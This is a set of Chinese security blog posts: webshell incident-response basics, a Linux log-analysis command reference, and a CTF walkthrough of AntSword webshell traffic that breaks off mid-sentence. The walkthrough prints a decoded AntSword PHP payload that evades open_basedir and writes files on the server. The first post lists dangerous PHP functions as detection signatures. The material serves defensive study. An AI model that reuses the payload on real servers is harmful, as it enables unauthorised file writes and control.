应急响应-webshell查杀前置知识什么是应急响应？\n简单官方一点：WebShell应急响应是指在检测到WebShell（恶意Web脚本）攻击后，采取一系列措施来控制、消除威胁，并恢复受影响的系统和服务。WebShell是一种常见的攻击手段，攻击者通过上传或注入恶意脚本到Web服务器上，从而获得对服务器的远程控制权限，而我们需要做的就是找到问题所在根源并且解决掉它\n一、手动排查webshell\n\n静态检测\n\n我们可以查找一些特殊后缀结尾的文件。例如：.asp、.php、.jsp、.aspx。然后再从这类文件中查找后门的特征码，特征值，危险函数来查找webshell，例如查找内容含有exec()、eval()、system()的文件。\n\n优点：快速方便，对已知的webshell查找准确率高，部署方便，一个脚本就能搞定。\n\n缺点：漏报率、误报率高，无法查找0day型webshell，而且容易被绕过。\n\n\n\n动态检测\n\nwebshell执行时刻表现出来的特征，我们称为动态特征。只要我们把webshell特有的HTTP请求&#x2F;响应做成特征库，加到IDS里面去检测所有的HTTP请求就好了。\nwebshell如果执行系统命令的话，会有进程。Linux下就是起了bash，Win下就是启动cmd，这些都是动态特征。\n\n\n日志检测\n\n使用Webshell一般不会在系统日志中留下记录，但是会在网站的web日志中留下Webshell页面的访问数据和数据提交记录。\n日志分析检测技术通过大量的日志文件建立请求模型从而检测出异常文件，例如：一个平时是GET的请求突然有了POST请求并且返回代码为200。\n\n\n\n二、工具排查webshell\n\n相对于手工排查，工具排查可能更好上手，但是如果想走的更远一些，某些线下的比赛可能会断网，也就说，手工排查的一些基本操作还是要明白的。（但是工具排查真的很香）\n推荐一些查杀的平台工具（大部分都是在线端）\n\n1、阿里伏魔\n\n2、河马\n\nCloudWalker(牧云)\n\n在线 webshell 查杀-灭绝师太版\n\nD盾\n\n微步在线\n\n\n\n简介靶机账号密码 root xjwebshell1.黑客webshell里面的flag flag{xxxxx-xxxx-xxxx-xxxx-xxxx}2.黑客使用的什么工具的shell github地址的md5 flag{md5}3.黑客隐藏shell的完整路径的md5 flag{md5} 注 : &#x2F;xxx&#x2F;xxx&#x2F;xxx&#x2F;xxx&#x2F;xxx.xxx4.黑客免杀马完整路径 md5 flag{md5}\n\n\n首先代码特征\n\nWebShell通常会使用一些危险的函数来执行系统命令或代码，如：\nPHP: eval(), system(), exec(), shell_exec(), passthru(), assert(), base64_decode()\nASP: Execute(), Eval(), CreateObject()\nJSP: Runtime.getRuntime().exec()\n\n\n\n\n编码和解码\n\nWebShell经常使用编码和解码技术来隐藏其真实意图，如Base64编码：\n\neval(base64_decode(&#39;encoded_string&#39;));\n           3. **文件操作**      * WebShell可能会包含文件操作函数，用于读取、写入或修改文件：        * PHP: `fopen()`, `fwrite()`, `file_get_contents()`, `file_put_contents()`        * ASP: `FileSystemObject`   4. **网络操作**      * WebShell可能会包含网络操作函数，用于与远程服务器通信:        * PHP: `fsockopen()`, `curl_exec()`, `file_get_contents(&#x27;http://...&#x27;)`        * ASP: `WinHttp.WinHttpRequest`   5. **特殊后缀文件 例如：.asp、.php、.jsp、.aspx。**#### 一、黑客webshell里面的flag flag&#123;xxxxx-xxxx-xxxx-xxxx-xxxx&#125;1. 搜索目录下适配当前应用的网页文件，查看内容是否有Webshell特征 很明显shell.php 是一个病毒文件,定位过去查看内容 并没有什么 继续分析其他两个文件2. 在gz.php文件里面发现了 木马   * &gt; 这段代码的目的是接收通过 `php://input` 流发送的数据，对其进行编码，并根据会话变量中的内容执行特定的 PHP 代码。这通常用于隐藏恶意代码或后门，使得攻击者可以通过特定的请求触发执行。\n\n\n\n\n\n","categories":["日志分析"],"tags":["学习笔记","应急响应","日志分析","安全运维"]},{"title":"应急响应常用命令","url":"/2025/09/16/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/","content":"应急响应常用命令Findfind 是 Linux 中非常强大且常用的命令行工具，用于在目录树中查找文件或目录。它支持按文件名、类型、时间、权限、大小等多种条件查找。\nfind 基本语法：find [查找路径] [查找条件] [查找动作]\n\n\n常用示例：1. 按文件名查找find /path/to/dir -name &quot;filename.txt&quot;\n\n\n精确匹配文件名（区分大小写）\n\nfind . -iname &quot;readme.md&quot;\n\n\n不区分大小写查找 readme.md 文件\n\n\n2. 查找目录find . -type d -name &quot;log&quot;\n\n\n查找当前目录下名为 log 的目录\n\n\n3. 查找普通文件find /etc -type f -name &quot;*.conf&quot;\n\n\n查找 /etc 下所有以 .conf 结尾的配置文件\n\n\n4. 按修改时间查找find . -mtime -3\n\n\n查找3天内修改过的文件（-mtime 单位是天）\n\nfind . -mmin -30\n\n\n查找30分钟内修改的文件\n\n\n5. 按文件大小查找find . -size +100M\n\n\n查找大于 100MB 的文件\n\nfind . -size -1k\n\n\n查找小于 1KB 的文件\n\n\n6. 按权限查找find / -perm 777\n\n\n查找权限为 777 的文件（所有人可读写执行）\n\n\n7. 查找后执行操作（如删除）find . -name &quot;*.tmp&quot; -delete\n\n\n查找并删除所有 .tmp 文件\n\nfind /var/log -type f -name &quot;*.log&quot; -exec rm &#123;&#125; \\;\n\n\n查找 .log 文件并执行 rm 删除命令，&#123;&#125; 表示匹配到的文件\n\n\n8. 结合正则查找find . -regex &quot;.*\\.\\(txt\\|log\\)&quot;\n\n\n使用正则查找 .txt 或 .log 文件（注意 -regex 默认匹配完整路径）\n\n\n提示：\n. 表示当前目录\n\n可以用 -maxdepth N 限制查找深度\n\n可以结合 grep 使用，例如：\nfind . -type f -name &quot;*.php&quot; | xargs grep &quot;password&quot;\n\nWCwc 是 Linux 中的一个命令，代表 “word count”（字数计数），它用于统计文件或标准输入中的字数、行数、字节数等。wc 是一个非常常用的工具，尤其在处理文本文件时，它可以帮助我们快速获取文件的统计信息。\n基本语法：wc [选项] [文件...]\n\n常见选项：\n-l：统计行数。\n-w：统计单词数。\n-c：统计字节数（包括文件的所有字符）。\n-m：统计字符数（和字节数类似，但考虑字符的编码，尤其在多字节字符集如 UTF-8 中有差异）。\n-L：统计最长一行的字符数。\n\n常见用法示例：1. 统计行数（-l）wc -l file.txt\n\n\n作用：输出 file.txt 文件的总行数。\n\n示例输出：\n100 file.txt\n\n这表示 file.txt 中有 100 行。\n2. 统计单词数（-w）wc -w file.txt\n\n\n作用：输出 file.txt 中的单词数量。一个单词是由空格、换行符或其他分隔符分开的。\n\n示例输出：\n500 file.txt\n\n这表示 file.txt 中有 500 个单词。\n3. 统计字节数（-c）wc -c file.txt\n\n\n作用：输出 file.txt 的字节数，包括所有字符。\n\n示例输出：\n1024 file.txt\n\n这表示 file.txt 中的内容占用了 1024 字节。\n4. 统计字符数（-m）wc -m file.txt\n\n\n作用：输出 file.txt 的字符数。与字节数类似，但在多字节字符编码下有所不同。\n\n示例输出：\n1120 file.txt\n\n这表示 file.txt 中的字符数为 1120。字符数和字节数的区别主要在于文件内容的编码。\n5. 统计最长行的长度（-L）wc -L file.txt\n\n\n作用：输出 file.txt 中最长一行的字符数。\n\n示例输出：\n120\n\n这表示 file.txt 中最长的行有 120 个字符。\n6. 同时显示多个统计信息wc -l -w -c file.txt\n\n\n作用：统计文件的行数、单词数和字节数，并一起显示。\n\n示例输出：\n100 500 1024 file.txt\n\n这表示 file.txt 中有 100 行，500 个单词，占用了 1024 字节。\n7. 对标准输入进行统计你可以使用管道将标准输入传递给 wc，例如：\necho &quot;Hello World&quot; | wc -w\n\n作用：统计输入的单词数。\n示例输出：\n2\n\n这表示 &quot;Hello World&quot; 中有 2 个单词。\n8. 统计多个文件wc -l file1.txt file2.txt\n\n\n作用：统计 file1.txt 和 file2.txt 中的行数。wc 会显示每个文件的行数，以及所有文件的总行数。\n\n示例输出：\n100 file1.txt200 file2.txt300 total\n\n这表示 file1.txt 有 100 行，file2.txt 有 200 行，总共有 300 行。\ngrepgrep 是 Linux 中用于在文本文件中搜索匹配的字符串并输出的强大命令。它可以使用正则表达式来进行模式匹配，广泛应用于日志分析、文本处理、脚本编写等。\n基本语法：grep [选项] PATTERN [文件...]\n\n\nPATTERN：要搜索的模式，可以是简单的文本字符串或正则表达式。\n文件：要搜索的文件。如果未指定文件，grep 会从标准输入读取数据。\n\n常用选项：\n-i：忽略大小写。\n-v：反向匹配，显示不包含模式的行。\n-r 或 -R：递归搜索目录中的文件。\n-l：只显示匹配模式的文件名。\n-n：显示匹配行的行号。\n-c：显示匹配的行数。\n-o：只显示匹配的文本部分，而不是整行。\n-w：匹配整个单词。\n-x：只匹配整行。\n-H：输出匹配行所在的文件名。\n-A NUM：输出匹配行及其之后的 NUM 行。\n-B NUM：输出匹配行及其之前的 NUM 行。\n-C NUM：输出匹配行及其前后各 NUM 行。\n\n例子：1. 基本搜索grep &quot;error&quot; logfile.txt\n\n\n作用：在 logfile.txt 文件中搜索包含 error 的行，并输出。\n\n2. 忽略大小写grep -i &quot;error&quot; logfile.txt\n\n\n作用：搜索 logfile.txt 文件中的 error（忽略大小写），匹配 ERROR、Error 等不同形式。\n\n3. 显示行号grep -n &quot;error&quot; logfile.txt\n\n\n作用：显示每个匹配行的行号，例如：\n3:error in connection15:error occurred\n\n4. 反向匹配（显示不包含指定文本的行）grep -v &quot;error&quot; logfile.txt\n\n\n作用：显示不包含 error 的所有行。\n\n5. 统计匹配的行数grep -c &quot;error&quot; logfile.txt\n\n\n作用：输出 logfile.txt 文件中匹配 error 的行数。\n\n6. 递归搜索目录中的所有文件grep -r &quot;error&quot; /var/log/\n\n\n作用：在 /var/log/ 目录下的所有文件中搜索 error。\n\n7. 只显示匹配的文件名grep -l &quot;error&quot; *.log\n\n\n作用：显示当前目录下所有 .log 文件中包含 error 的文件名。\n\n8. 只显示匹配的文本部分grep -o &quot;error&quot; logfile.txt\n\n\n作用：只输出匹配的文本部分，而不是整行。例如，如果一行包含多个 “error”，会显示多个 error。\n\n9. 匹配整个单词grep -w &quot;error&quot; logfile.txt\n\n\n作用：仅匹配完整的单词 error，不匹配像 errors 或 supererror 这样的词。\n\n10. 搜索多个模式grep -e &quot;error&quot; -e &quot;warning&quot; logfile.txt\n\n\n作用：同时搜索 error 和 warning。\n\n11. 显示匹配行及其上下文\n-A NUM：显示匹配行及其后 NUM 行。\ngrep -A 2 &quot;error&quot; logfile.txt\n\n\n作用：显示匹配 error 的行及其后两行。\n\n\n-B NUM：显示匹配行及其前 NUM 行。\ngrep -B 2 &quot;error&quot; logfile.txt\n\n\n作用：显示匹配 error 的行及其前两行。\n\n\n-C NUM：显示匹配行及其前后各 NUM 行。\ngrep -C 2 &quot;error&quot; logfile.txt\n\n\n作用：显示匹配 error 的行及其前后两行。\n\n\n\n12. 匹配正则表达式grep -E &quot;erro(r|r*)&quot; logfile.txt\n\n\n作用：使用扩展正则表达式（ERE），匹配 erro 后跟一个或多个 r 的字符串，例如 error 和 errrrr。\n\n13. 只匹配整行grep -x &quot;error&quot; logfile.txt\n\n\n作用：只匹配整行内容为 error 的行。\n\nawkawk 是一个强大的文本处理工具，常用于对文件中的数据进行操作和分析。awk 基于模式匹配，能够按列（字段）处理文件中的文本数据，非常适合用来处理结构化的文本，如日志文件、CSV 文件等。\n基本语法：awk &#x27;pattern &#123;action&#125;&#x27; input_file\n\n\npattern：模式，awk 会搜索与该模式匹配的行。\naction：对匹配的行执行的操作。常见的操作包括打印某些字段、计算、替换等。如果没有指定 action，则默认打印匹配行。\n\n常见选项：\n-F：指定字段分隔符。默认情况下，awk 使用空格或制表符作为字段分隔符，但可以通过 -F 选项指定其他分隔符。\n-v：设置变量值，允许在 awk 脚本中传递外部变量。\n\n字段（$符号）：\n$1：第一个字段（列）。\n$2：第二个字段（列）。\n$0：整行文本（包括所有字段）。\n\n常见用法：1. 打印文件的内容awk &#x27;&#123;print $0&#125;&#x27; file.txt\n\n\n作用：打印文件的每一行。$0 代表整行文本。\n\n2. 打印文件中的某一列awk &#x27;&#123;print $1&#125;&#x27; file.txt\n\n\n作用：打印文件的第一列。如果文件中有多个列，$1 表示第一个字段。\n\nawk &#x27;&#123;print $2&#125;&#x27; file.txt\n\n\n作用：打印第二列。\n\n3. 指定字段分隔符（例如 CSV 文件）awk -F, &#x27;&#123;print $1, $2&#125;&#x27; file.csv\n\n\n作用：在 CSV 文件中指定逗号（,）作为字段分隔符，打印文件的前两列。\n\n4. 条件判断awk &#x27;$1 == &quot;Alice&quot; &#123;print $2&#125;&#x27; file.txt\n\n\n作用：打印第一列为 “Alice” 时的第二列。\n\n5. 计算列的总和awk &#x27;&#123;sum += $1&#125; END &#123;print sum&#125;&#x27; file.txt\n\n\n作用：对文件的第一列求和并打印总和。sum += $1 表示累加每行的第一个字段，END &#123;print sum&#125; 会在处理完所有行后输出结果。\n\n6. 打印特定条件下的行awk &#x27;$3 &gt; 50 &#123;print $1, $3&#125;&#x27; file.txt\n\n\n作用：如果第三列的值大于 50，则打印第一列和第三列。\n\n7. 使用正则表达式进行匹配awk &#x27;/pattern/ &#123;print $0&#125;&#x27; file.txt\n\n\n作用：匹配包含 “pattern” 的行，并打印该行。可以使用正则表达式来匹配模式。\n\n8. 计算文件中的列平均值awk &#x27;&#123;sum += $1&#125; END &#123;if (NR &gt; 0) print sum / NR&#125;&#x27; file.txt\n\n\n作用：计算文件第一列的平均值。NR 是记录的行数（行号），sum / NR 计算平均值。\n\n9. 使用多个命令awk &#x27;&#123;print $1; print $2&#125;&#x27; file.txt\n\n\n作用：打印每行的第一列和第二列。\n\n10. 在 awk 中使用外部变量awk -v threshold=50 &#x27;$3 &gt; threshold &#123;print $1, $3&#125;&#x27; file.txt\n\n\n作用：使用外部变量 threshold 来过滤第三列大于该值的行。在这个例子中，threshold 的值为 50。\n\n11. 修改字段内容awk &#x27;&#123;$2=&quot;modified&quot;; print $0&#125;&#x27; file.txt\n\n\n作用：将每行的第二列修改为 “modified” 并打印整行。\n\n12. 按分隔符处理复杂数据（例如多个分隔符）awk -F&#x27;[: ]&#x27; &#x27;&#123;print $1, $2&#125;&#x27; file.txt\n\n\n作用：使用冒号（:）和空格（ ）作为字段分隔符，打印第一列和第二列。\n\n结合管道使用：awk 经常和其他命令（如 grep, sort, cut 等）结合使用。\n示例 1：使用 grep 和 awk 查找并处理数据：grep &quot;pattern&quot; file.txt | awk &#x27;&#123;print $1, $3&#125;&#x27;\n\n\n作用：首先用 grep 查找包含 “pattern” 的行，然后用 awk 打印匹配行的第一列和第三列。\n\n示例 2：用 awk 处理输出并排序：awk &#x27;&#123;print $1, $2&#125;&#x27; file.txt | sort -k2\n\n\n作用：用 awk 提取第一列和第二列，然后用 sort 按第二列排序。\n\nsortsort 是 Linux 中用于对文本行进行排序的命令。它非常强大，支持多种排序方式，适用于按字母、数字、日期等方式对文本数据进行排序。\n基本语法：sort [选项] [文件...]\n\n\n文件：要排序的文件。如果没有指定文件，sort 将从标准输入（通常是终端）读取数据。\n\n常用选项：\n-n：按数值大小排序（默认按字典顺序排序）。\n-r：按降序排序（默认按升序排序）。\n-k：指定排序的列（字段）。\n-t：指定字段分隔符，默认是空格或制表符。\n-u：删除重复的行，只保留唯一的行。\n-b：忽略行首的空格。\n-f：忽略大小写进行排序。\n-M：按月份排序（适用于包含月份名的日期格式）。\n-T：指定临时文件的存储位置。\n\n常见用法：1. 按字典顺序排序（升序）sort file.txt\n\n\n作用：按字母（字典顺序）对 file.txt 文件中的行进行升序排序。\n\n2. 按数值排序sort -n file.txt\n\n\n作用：按照数值的大小对 file.txt 文件中的行进行排序，而不是字母顺序。\n\n3. 按降序排序sort -r file.txt\n\n\n作用：按降序对文件进行排序（默认是升序排序）。\n\n4. 按列排序假设 file.txt 文件内容如下：\nJohn 50Alice 25Bob 30\n\n\n按第二列（年龄）排序：\n\nsort -k2 file.txt\n\n\n作用：根据文件的第二列（年龄）对行进行升序排序。\n\n5. 指定分隔符进行排序假设 file.csv 文件内容如下：\nJohn,50Alice,25Bob,30\n\n\n按逗号分隔并根据第二列排序：\n\nsort -t&#x27;,&#x27; -k2 file.csv\n\n\n作用：指定逗号（,）作为字段分隔符，然后根据第二列进行排序。\n\n6. 按降序排序并去重sort -r -u file.txt\n\n\n作用：按降序排序，并去除重复的行，只保留唯一的行。\n\n7. 忽略大小写排序sort -f file.txt\n\n\n作用：忽略大小写进行排序。例如，apple 和 Apple 会被视为相同。\n\n8. 按月份排序假设 file.txt 文件内容如下：\nJan 10Feb 5Mar 20\n\n\n按月份排序：\n\nsort -M file.txt\n\n\n作用：根据月份名称（如 Jan, Feb, Mar）进行排序。\n\n9. 按照多个列进行排序假设 file.txt 文件内容如下：\nJohn 50Alice 30Alice 25Bob 30\n\n\n先按第二列（年龄）升序，再按第一列（名字）升序排序：\n\nsort -k2 -k1 file.txt\n\n\n作用：首先根据第二列（年龄）升序排序，如果年龄相同，再根据第一列（名字）升序排序。\n\n10. 排序并输出到另一个文件sort file.txt &gt; sorted_file.txt\n\n\n作用：将 file.txt 排序后的结果输出到 sorted_file.txt 文件中。\n\n11. 删除重复行sort -u file.txt\n\n\n作用：排序并去除重复的行。\n\n示例：假设 file.txt 内容如下：\n35124\n\n\n按数字升序排序：\nsort -n file.txt\n\n输出：\n12345\n\n按数字降序排序：\nsort -n -r file.txt\n\n输出：\n54321\n\nuniquniq 是 Linux 中的一个命令，用于删除文件中的重复行，并且可以对输入进行统计、排序等操作。通常，uniq 命令与 sort 命令一起使用，以便在排序的文本中去除重复行。\n基本语法：uniq [选项] [输入文件] [输出文件]\n\n\n输入文件：默认从标准输入读取，或指定输入文件。\n输出文件：默认将结果输出到标准输出，也可以重定向到文件中。\n\n常见选项：\n-c：显示每行重复出现的次数。\n-d：只显示重复出现的行。\n-u：只显示唯一的、不重复的行。\n-i：忽略大小写，进行不区分大小写的比较。\n-w N：比较前 N 个字符。\n-f N：忽略每行前 N 个字段。\n-s N：忽略每行前 N 个字符（按字符跳过）。\n\n常见用法：1. 去除重复行uniq file.txt\n\n\n作用：显示 file.txt 文件中不重复的行，连续相同的行只保留一个。\n\n2. 统计每行出现的次数uniq -c file.txt\n\n\n作用：显示 file.txt 文件中每行的出现次数。每个重复的行会在前面显示出现次数。\n\n示例输出：\n3 apple2 banana1 orange\n\n这表示 apple 出现了 3 次，banana 出现了 2 次，orange 出现了 1 次。\n3. 只显示重复的行uniq -d file.txt\n\n\n作用：仅显示在 file.txt 文件中重复出现的行。\n\n示例输出：\napplebanana\n\n这表示 apple 和 banana 是重复的行。\n4. 只显示唯一的行（不重复的行）uniq -u file.txt\n\n\n作用：显示 file.txt 文件中唯一的、不重复的行。\n\n示例输出：\norange\n\n这表示 orange 是唯一的、不重复的行。\n5. 忽略大小写进行比较uniq -i file.txt\n\n\n作用：忽略大小写，去除重复的行。例如，apple 和 APPLE 被视为相同的行。\n\n6. 指定比较字段uniq -f 2 file.txt\n\n\n作用：忽略每行的前两个字段，只比较后面的字段。例如，如果每行包含多个字段（如空格分隔的字段），可以指定 -f 选项来跳过前 N 个字段进行比较。\n\n7. 指定比较字符数uniq -w 5 file.txt\n\n\n作用：仅比较每行前 5 个字符，忽略其余字符进行去重。\n\n8. 与 sort 配合使用为了确保 uniq 去重有效，通常会先使用 sort 排序文本文件，然后再使用 uniq 去除重复行：\nsort file.txt | uniq\n\n\n作用：首先使用 sort 将文件按字典顺序排序，然后使用 uniq 去除重复行。\n\n9. 去重并输出到文件uniq file.txt &gt; unique_file.txt\n\n\n作用：去重 file.txt 中的重复行，并将结果输出到 unique_file.txt 文件中。\n\n示例：假设 file.txt 内容如下：\napplebananaappleorangebananagrapeapple\n\n\n去除重复行：\nuniq file.txt\n\n输出：\napplebananaorangegrape\n\n统计每行出现的次数：\nuniq -c file.txt\n\n输出：\n3 apple2 banana1 orange1 grape\n\n只显示重复的行：\nuniq -d file.txt\n\n输出：\napplebanana\n\n只显示唯一的行（不重复的行）：\nuniq -u file.txt\n\n输出：\norangegrape\n\nuniq sort awk grep用法的组合使用在应急响应中，经常会使用 uniq、sort、awk 和 grep 等命令来处理日志文件、统计数据、过滤和分析信息。这些命令各有独特的功能，组合使用可以实现更强大的数据处理和分析。以下是一些常见的命令组合，用于日志分析和数据筛选：\n1. 结合 sort 和 uniq 统计重复行这两个命令结合使用，常用于去除重复行，并计算每行出现的次数。\n\n示例：统计 Apache 访问日志中每个 IP 地址的访问次数。\ncat access.log | sort | uniq -c | sort -nr\n\n解释：\n\nsort：将 access.log 中的行排序。\nuniq -c：对排序后的结果进行去重，并统计每个 IP 地址的出现次数。\nsort -nr：按降序排列输出结果，显示访问次数最多的 IP 地址。\n\n\n\n2. 结合 grep 和 sort 筛选并排序grep 用于过滤数据，sort 用于排序，可以很方便地筛选并排序日志文件。\n\n示例：显示包含 error 的行并按日期排序。\ngrep &quot;error&quot; access.log | sort\n\n解释：\n\ngrep &quot;error&quot;：筛选出包含 error 的所有行。\nsort：按字典顺序对筛选出的行进行排序。\n\n\n\n3. 结合 awk 和 sort 按列排序awk 用于提取并处理字段，sort 用于按某一列排序。\n\n示例：按第一个字段（IP 地址）进行排序并显示 IP 和请求次数。\nawk &#x27;&#123;print $1&#125;&#x27; access.log | sort | uniq -c | sort -nr\n\n解释：\n\nawk &#39;&#123;print $1&#125;&#39;：提取 access.log 文件中的第一列（IP 地址）。\nsort：对 IP 地址进行排序。\nuniq -c：统计每个 IP 地址出现的次数。\nsort -nr：按出现次数进行降序排序。\n\n\n\n4. 结合 grep 和 awk 过滤并处理日志grep 用于快速过滤出相关内容，awk 用于进一步分析并处理数据。\n\n示例：提取所有失败的登录尝试并显示 IP 地址和用户名。\ngrep &quot;Failed password&quot; /var/log/auth.log | awk &#x27;&#123;print $1, $2, $3, $11&#125;&#x27;\n\n解释：\n\ngrep &quot;Failed password&quot;：筛选出包含 Failed password 的日志行。\nawk &#39;&#123;print $1, $2, $3, $11&#125;&#39;：显示日志行的前 3 个字段（日期、时间和主机名）和第 11 个字段（用户名）。\n\n\n\n5. 结合 grep 和 sort 排序后去重grep 用于过滤，sort 和 uniq 结合使用来去重并按顺序输出。\n\n示例：查找所有请求的 URL，并按照字母顺序去重和排序。\ngrep -oP &#x27;GET \\K\\S+&#x27; access.log | sort | uniq\n\n解释：\n\ngrep -oP &#39;GET \\K\\S+&#39;：使用 grep 和 Perl 正则表达式（-P）提取所有 GET 请求后的 URL 部分。\nsort：对 URL 进行排序。\nuniq：去重，确保每个 URL 只出现一次。\n\n\n\n6. 结合 awk 和 grep 用于统计特定条件的数据awk 用于过滤特定条件的数据，grep 用于更精细的文本搜索。\n\n示例：查找访问次数最多的 URL，并显示访问的次数。\ngrep &quot;GET&quot; access.log | awk &#x27;&#123;print $7&#125;&#x27; | sort | uniq -c | sort -nr\n\n解释：\n\ngrep &quot;GET&quot;：筛选出所有 GET 请求。\nawk &#39;&#123;print $7&#125;&#39;：提取日志的第七列（即 URL）。\nsort：排序。\nuniq -c：统计每个 URL 的访问次数。\nsort -nr：按访问次数降序排列。\n\n\n\n7. 结合 awk、grep 和 sort 筛选并按条件排序可以结合多个命令，首先过滤、然后处理字段并排序。\n\n示例：找出所有 HTTP 404 错误的请求，并按 IP 地址和状态码排序。\ngrep &quot;404&quot; access.log | awk &#x27;&#123;print $1, $9&#125;&#x27; | sort\n\n解释：\n\ngrep &quot;404&quot;：筛选出所有 HTTP 404 错误的请求。\nawk &#39;&#123;print $1, $9&#125;&#39;：提取 IP 地址（第一列）和 HTTP 状态码（第九列）。\nsort：按 IP 地址和状态码进行排序。\n\n\n\n8. 结合 awk 和 sort 进行统计和排序awk 和 sort 常用于提取某些字段进行统计后排序。\n\n示例：计算每个 IP 地址访问的总字节数，并按降序排序。\nawk &#x27;&#123;print $1, $10&#125;&#x27; access.log | sort | uniq -c | sort -nr\n\n解释：\n\nawk &#39;&#123;print $1, $10&#125;&#39;：提取每行的 IP 地址（第一列）和字节数（第十列）。\nsort：排序，按 IP 地址和字节数。\nuniq -c：统计每个 IP 地址的访问次数。\nsort -nr：按降序排序，显示访问最多的 IP 地址和它们的字节数。\n\n\n\n9. 结合 sort、uniq 和 awk 查找访问频次最高的请求方法\n示例：查看 HTTP 请求方法（如 GET、POST）的出现次数，并按频次降序排列。\nawk &#x27;&#123;print $6&#125;&#x27; access.log | sort | uniq -c | sort -nr\n\n解释：\n\nawk &#39;&#123;print $6&#125;&#39;：提取每行的 HTTP 请求方法（通常是第六列）。\nsort：对方法进行排序。\nuniq -c：统计每种请求方法的出现次数。\nsort -nr：按出现次数降序排列。\n\n\n\n总结：uniq、sort、awk 和 grep 是 Linux 中常用的文本处理工具，它们在应急响应过程中可以用于日志分析、流量监控、数据提取和统计等任务。通过组合使用这些命令，可以高效地筛选、排序、统计和分析大量的日志数据，帮助分析系统的状态和潜在的安全威胁。\n","categories":["日志分析"],"tags":["学习笔记","应急响应","日志分析","安全运维"]},{"title":"第六章 流量特征分析-蚁剑流量分析","url":"/2025/09/16/%E7%AC%AC%E5%85%AD%E7%AB%A0%20%E6%B5%81%E9%87%8F%E7%89%B9%E5%BE%81%E5%88%86%E6%9E%90-%E8%9A%81%E5%89%91%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/","content":"第六章 流量特征分析-蚁剑流量分析1.木马的连接密码是多少2.黑客执行的第一个命令是什么3.黑客读取了哪个文件的内容，提交文件绝对路径4.黑客上传了什么文件到服务器，提交文件名5.黑客上传的文件内容是什么6.黑客下载了哪个文件，提交文件绝对路径\n\n1.木马的连接密码是多少webshell链接工具是用post传输的我们直接在wireshark里面输入命令\nhttp.request.method ==&quot;POST&quot;\n\n来定位用post传输的流量\n\n在未启用编码器或使用默认配置时，木马密码直接作为POST请求的第一个参数名出现。\n打开第一个就能看到链接密码\nflag&#123;1&#125;\n\n\n2.黑客执行的第一个命令是什么上一题我们知道1.php为黑客上传的shell了这里我们对这个文件进行搜索\nhttp contains &quot;1.php&quot;\n\n\n打开长度为894的流量包 右键 追踪http流 作\n在蚁剑流量中，黑客执行的命令隐藏在 POST请求的特定参数值 中，需关注以下特征：\n\n参数命名规则：\n参数名格式为 ma[16位随机字符]、uc[16位随机字符]（如示例中的 ucc3f8650c92ac）。\n此类参数携带经过混淆的命令负载。\n\n\n混淆机制：\n参数值前2字符为蚁剑生成的随机字符（用于绕过简单规则检测），后续内容为Base64编码的命令序列。\n\n\n\n将post请求体末尾的base64代码去掉头两位复制到base63解码即可看到黑客的操\n\n\n\nflag&#123;id&#125;\n\n3.黑客读取了哪个文件的内容，提交文件绝对路径继续分析流量包，在856这个流量包这里将命令解码\n\n\n\n将post请求包复制到网站进行url解码https://www.toolhelper.cn/EncodeDecode/Url就可以看到明文传输，直接复制也可以\n\n将最后base64加密的代码复制去掉前两位：这是蚁剑的随机前缀即可解密拿到明文密码\n\n\n题目问我们黑客读取了哪个文件\nflag&#123;/etc/passwd&#125;\n\n4.黑客上传了什么文件到服务器，提交文件名继续分析流量包在长度为646这里发现了黑客上传的文件\n\n去掉前两位拿去url解码在base64解码\n\n\n\nflag&#123;flag.txt&#125;\n\n5.黑客上传的文件内容是什么这一题其实一题里面就能看的出来，将上一题的请求体拿去url解码\n\n整理一下\n1=@ini_set(&quot;display_errors&quot;, &quot;0&quot;);@set_time_limit(0);$opdir=@ini_get(&quot;open_basedir&quot;);if($opdir) &#123;    $ocwd=dirname($_SERVER[&quot;SCRIPT_FILENAME&quot;]);    $oparr=preg_split(base64_decode(&quot;Lzt8Oi8=&quot;),$opdir);    @array_push($oparr,$ocwd,sys_get_temp_dir());    foreach($oparr as $item) &#123;        if(!@is_writable($item))&#123;continue;&#125;;        $tmdir=$item.&quot;/.368479785&quot;;        @mkdir($tmdir);        if(!@file_exists($tmdir))&#123;continue;&#125;        $tmdir=realpath($tmdir);        @chdir($tmdir);        @ini_set(&quot;open_basedir&quot;, &quot;..&quot;);        $cntarr=@preg_split(&quot;/\\\\\\\\|\\//&quot;,$tmdir);        for($i=0;$i&lt;sizeof($cntarr);$i++)&#123;            @chdir(&quot;..&quot;);        &#125;;        @ini_set(&quot;open_basedir&quot;,&quot;/&quot;);        @rmdir($tmdir);        break;    &#125;;&#125;;function asenc($out)&#123;return $out;&#125;;function asoutput()&#123;    $output=ob_get_contents();    ob_end_clean();    echo &quot;6960&quot;.&quot;cb205&quot;;    echo @asenc($output);    echo &quot;1e0a&quot;.&quot;91914&quot;;&#125;ob_start();try&#123;    $f=base64_decode(substr($_POST[&quot;t41ffbc5fb0c04&quot;],2));    $c=$_POST[&quot;ld807e7193493d&quot;];    $c=str_replace(&quot;\\r&quot;,&quot;&quot;,$c);    $c=str_replace(&quot;\\n&quot;,&quot;&quot;,$c);    $buf=&quot;&quot;;    for($i=0;$i&lt;strlen($c);$i+=2)        $buf.=urldecode(&quot;%&quot;.substr($c,$i,2));    echo(@fwrite(fopen($f,&quot;a&quot;),$buf)?&quot;1&quot;:&quot;0&quot;);&#125;catch(Exception $e)&#123;    echo &quot;ERROR://&quot;.$e-&gt;getMessage();&#125;;asoutput();die();&amp;ld807e7193493d=666C61677B77726974655F666C61677D0A&amp;t41ffbc5fb0c04=0ZL3Zhci93d3cvaHRtbC9mbGFnLnR4dA==\n\n\n通过 $_POST[&quot;t41ffbc5fb0c04&quot;] 接收Base64编码的目标文件路径（解码后为 /var/[www/html/flag.txt](https://www/html/flag.txt)）。\n通过 $_POST[&quot;ld807e7193493d&quot;] 接收十六进制编码的文件内容（解码后为 flag&#123;write_flag&#125;），并写入目标文件 。\n使用 fopen($f, &quot;a&quot;) 以追加模式打开文件，fwrite() 写入内容，成功返回 1，失败返回 0 。\n\nhttps://try8.cn/tool/code/hex 使用解码器解码\n\nflag&#123;write_flag&#125;\n\n6.黑客下载了哪个文件，提交文件绝对路径继续分析1.php的流量在最后一个流量包里面，将里面的请求体进行url解码\n\n\n可以看到黑客的操作\n\n通过POST参数t41ffbc5fb0c04传递Base64编码的目标路径（2eL3Zh... → 